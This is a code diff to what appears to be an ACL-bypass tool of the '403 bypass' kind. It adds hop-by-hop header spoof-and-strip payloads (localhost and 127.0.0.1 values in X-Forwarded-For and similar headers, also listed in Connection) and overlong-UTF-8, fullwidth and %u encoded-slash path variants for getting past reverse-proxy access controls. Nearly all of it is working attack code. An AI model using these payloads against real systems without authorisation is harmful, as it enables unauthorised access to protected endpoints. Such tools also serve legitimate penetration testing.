@@ -100,16 +100,25 @@ _SUFFIXES = (
 # server normalises these differently before vs after the ACL check.
 _PREFIXES = ("/./", "//", "/%2e/", "/%2e%2e//", "/.;/")
 
-# Hop-by-hop stripping (RFC 7230 §6.1): a header listed in `Connection` MUST be
-# removed by a conforming intermediary before forwarding. If a front proxy
-# enforces the ACL via one of these headers, naming it in Connection strips it in
-# transit and the backend — which may allow — never sees it. (httpx sends the
-# custom Connection value verbatim, confirmed.)
-_HOP_STRIP = (
-    "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "X-Forwarded-Proto",
-    "X-Forwarded-Server", "Forwarded", "X-Original-URL", "X-Rewrite-URL",
-    "X-Forwarded", "X-ProxyUser-Ip",
-)
+# Hop-by-hop bypass (RFC 7230 §6.1): a header named in `Connection` MUST be
+# removed by a conforming intermediary before forwarding. The potent form against
+# a reverse-proxy CHAIN (BruteLogic's testbed) is SPOOF+STRIP: send a trusted
+# value AND list the header in Connection, so the edge proxy allows on the value
+# then strips it — the inner proxy / backend re-evaluates without it and may pass.
+# (httpx sends the custom Connection value verbatim, confirmed.)
+_HOP_SPOOF = {
+    "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1",
+    "X-Forwarded-Host": "localhost", "X-Forwarded-Proto": "http",
+    "X-Forwarded-Server": "localhost", "Forwarded": "for=127.0.0.1;host=localhost",
+    "X-ProxyUser-Ip": "127.0.0.1",
+}
+# Pure strip (no value) — for headers whose mere ABSENCE downstream flips the ACL.
+_HOP_STRIP = ("X-Original-URL", "X-Rewrite-URL", "X-Forwarded", "Via")
+
+# Encoded-separator bypass: a normalizer that decodes an overlong-UTF-8 (`%c0%af`),
+# fullwidth (`%ef%bc%8f`), or IIS `%u` slash AFTER the ACL check resolves a path
+# the ACL never matched — the "understand the stack" class.
+_ENC_SEP = ("%c0%af", "%e0%80%af", "%ef%bc%8f", "%uff0f", "%25c0%25af")
 
 # API version-prefix bypass: an ACL bound to `/admin` may not cover `/v1/admin`
 # (or vice-versa) when the app routes both to the same handler.
@@ -178,10 +187,25 @@ def variants(path: str, case_insensitive: bool = False,
     for h in ("X-Original-URL", "X-Rewrite-URL", "X-HTTP-DestinationURL", "Request-URI"):
         add(f"header {h}", "GET", "/", {h: p})
 
-    # --- hop-by-hop header stripping (BruteLogic) — strip a proxy-enforced header
-    # in transit by naming it in Connection, so the (permissive) backend never sees it ---
+    # --- hop-by-hop bypass (BruteLogic) — spoof a trusted value AND name it in
+    # Connection so the edge allows then strips it (proxy-chain desync); plus a
+    # pure-strip set and one batch strip of the whole proxy-header surface ---
+    for h, val in _HOP_SPOOF.items():
+        add(f"hop-by-hop spoof+strip {h}", "GET", p, {h: val, "Connection": f"close, {h}"})
     for h in _HOP_STRIP:
         add(f"hop-by-hop strip {h}", "GET", p, {"Connection": f"close, {h}"})
+    add("hop-by-hop strip proxy-set", "GET", p,
+        {"Connection": "close, " + ", ".join(_HOP_SPOOF)})
+
+    # --- encoded-separator bypass — overlong/fullwidth/%u slashes the ACL won't
+    # match but a downstream normalizer decodes (leading, trailing, and mid-path) ---
+    for sep in _ENC_SEP:
+        add(f"enc-sep {p}{sep}", "GET", p + sep, {})
+        add(f"enc-sep /{sep}{body}", "GET", "/" + sep + body, {})
+    if "/" in body:
+        head, _, tail = body.rpartition("/")
+        for sep in _ENC_SEP:
+            add(f"enc-sep mid {sep}", "GET", "/" + head + sep + tail, {})
 
     # --- API version-prefix bypass — add a version segment the ACL may not cover,
     # and (if the path already has one) strip it ---
